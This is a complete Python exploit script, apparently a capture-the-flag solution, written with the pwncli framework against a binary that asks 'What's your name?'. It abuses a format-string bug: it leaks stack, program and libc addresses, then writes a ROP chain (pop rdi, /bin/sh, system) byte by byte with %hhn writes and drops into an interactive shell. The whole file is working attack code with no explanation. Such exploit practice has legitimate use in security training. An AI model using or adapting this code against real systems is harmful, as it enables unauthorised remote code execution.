#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c: str(c).encode()
lg = lambda s: log.info("\033[1;31;40m %s --> 0x%x \033[0m" % (s, eval(s)))
debugB = lambda: input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

current_n = 0


def generate_hhn_payload(distance, hhn_data):
    global current_n
    offset = (distance // 8) + 6
    if hhn_data > current_n:
        temp = hhn_data - current_n
    elif hhn_data < current_n:
        temp = 0x100 - current_n + hhn_data
    elif hhn_data == current_n:
        return b"%" + i2b(offset) + b"hhn"
    current_n = hhn_data
    return b"%" + i2b(temp) + b"c%" + i2b(offset) + b"$hhn"


#  ru(b":")
#  sl(b"17:MEUCIFtZ0Xqk5CauMwvYNQClJbNoG1bSMwpNLmbZCcAslJ+yAiEA9vQFGEWs9V0MpLGAWEbmgtJFRkpgzBH03sDXe6gys/g=")

ru(b"What's your name?\n")
current_n = 0
payload = b"%40$p.%41$p.%43$p."
sl(payload)
#  input()
stack_buf = int(ru(b".", drop=True), 16) - 0x120
elf_base = int(ru(b".", drop=True), 16) - 0x1307
libc_base = int(ru(b".", drop=True), 16) - 0x29D90
lg("stack_buf")
lg("elf_base")
lg("libc_base")
ru(b"? Why is your name so strange? I want your real name!!\n")
current_n = 0
payload = generate_hhn_payload(0xC0, 2)
payload = payload.ljust(0xC0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)

pop_rdi_ret = libc_base + 0x000000000002A3E5
ret_addr = pop_rdi_ret + 1
bin_sh_str = libc_base + next(libc.search(b"/bin/sh\x00"))
system_addr = libc_base + libc.sym.system

ru(b"What's your name?\n")
current_n = 0
payload = generate_hhn_payload(0xC0, 2)
payload = payload.ljust(0xC0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)
ru(b"? Why is your name so strange? I want your real name!!\n")
current_n = 0
payload = generate_hhn_payload(0xC0, ((pop_rdi_ret) & 0xFF))
payload += generate_hhn_payload(0xC8, ((pop_rdi_ret >> 8) & 0xFF))
payload += generate_hhn_payload(0xD0, ((pop_rdi_ret >> 16) & 0xFF))
payload += generate_hhn_payload(0xD8, ((pop_rdi_ret >> 24) & 0xFF))
payload += generate_hhn_payload(0xE0, ((pop_rdi_ret >> 32) & 0xFF))
payload += generate_hhn_payload(0xE8, ((pop_rdi_ret >> 40) & 0xFF))
payload = payload.ljust(0xC0, b"\x00")
payload += p64(stack_buf + 8 + 0x118)
payload += p64(stack_buf + 8 + 0x119)
payload += p64(stack_buf + 8 + 0x11A)
payload += p64(stack_buf + 8 + 0x11B)
payload += p64(stack_buf + 8 + 0x11C)
payload += p64(stack_buf + 8 + 0x11D)
sl(payload)

ru(b"What's your name?\n")
current_n = 0
payload = generate_hhn_payload(0xC0, 2)
payload = payload.ljust(0xC0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)
ru(b"? Why is your name so strange? I want your real name!!\n")
current_n = 0
payload = generate_hhn_payload(0xC0, ((bin_sh_str) & 0xFF))
payload += generate_hhn_payload(0xC8, ((bin_sh_str >> 8) & 0xFF))
payload += generate_hhn_payload(0xD0, ((bin_sh_str >> 16) & 0xFF))
payload += generate_hhn_payload(0xD8, ((bin_sh_str >> 24) & 0xFF))
payload += generate_hhn_payload(0xE0, ((bin_sh_str >> 32) & 0xFF))
payload += generate_hhn_payload(0xE8, ((bin_sh_str >> 40) & 0xFF))
payload = payload.ljust(0xC0, b"\x00")
payload += p64(stack_buf + 16 + 0x118)
payload += p64(stack_buf + 16 + 0x119)
payload += p64(stack_buf + 16 + 0x11A)
payload += p64(stack_buf + 16 + 0x11B)
payload += p64(stack_buf + 16 + 0x11C)
payload += p64(stack_buf + 16 + 0x11D)
sl(payload)

ru(b"What's your name?\n")
current_n = 0
payload = generate_hhn_payload(0xC0, 2)
payload = payload.ljust(0xC0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)
ru(b"? Why is your name so strange? I want your real name!!\n")
current_n = 0
payload = generate_hhn_payload(0xC0, ((system_addr) & 0xFF))
payload += generate_hhn_payload(0xC8, ((system_addr >> 8) & 0xFF))
payload += generate_hhn_payload(0xD0, ((system_addr >> 16) & 0xFF))
payload += generate_hhn_payload(0xD8, ((system_addr >> 24) & 0xFF))
payload += generate_hhn_payload(0xE0, ((system_addr >> 32) & 0xFF))
payload += generate_hhn_payload(0xE8, ((system_addr >> 40) & 0xFF))
payload = payload.ljust(0xC0, b"\x00")
payload += p64(stack_buf + 24 + 0x118)
payload += p64(stack_buf + 24 + 0x119)
payload += p64(stack_buf + 24 + 0x11A)
payload += p64(stack_buf + 24 + 0x11B)
payload += p64(stack_buf + 24 + 0x11C)
payload += p64(stack_buf + 24 + 0x11D)
sl(payload)

ru(b"What's your name?\n")
current_n = 0
payload = generate_hhn_payload(0xC0, 2)
payload = payload.ljust(0xC0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)
ru(b"? Why is your name so strange? I want your real name!!\n")
current_n = 0
payload = generate_hhn_payload(0xC0, ((ret_addr) & 0xFF))
payload += generate_hhn_payload(0xC8, ((ret_addr >> 8) & 0xFF))
payload += generate_hhn_payload(0xD0, ((ret_addr >> 16) & 0xFF))
payload += generate_hhn_payload(0xD8, ((ret_addr >> 24) & 0xFF))
payload += generate_hhn_payload(0xE0, ((ret_addr >> 32) & 0xFF))
payload += generate_hhn_payload(0xE8, ((ret_addr >> 40) & 0xFF))
payload = payload.ljust(0xC0, b"\x00")
payload += p64(stack_buf + 0 + 0x118)
payload += p64(stack_buf + 0 + 0x119)
payload += p64(stack_buf + 0 + 0x11A)
payload += p64(stack_buf + 0 + 0x11B)
payload += p64(stack_buf + 0 + 0x11C)
payload += p64(stack_buf + 0 + 0x11D)
sl(payload)

ia()
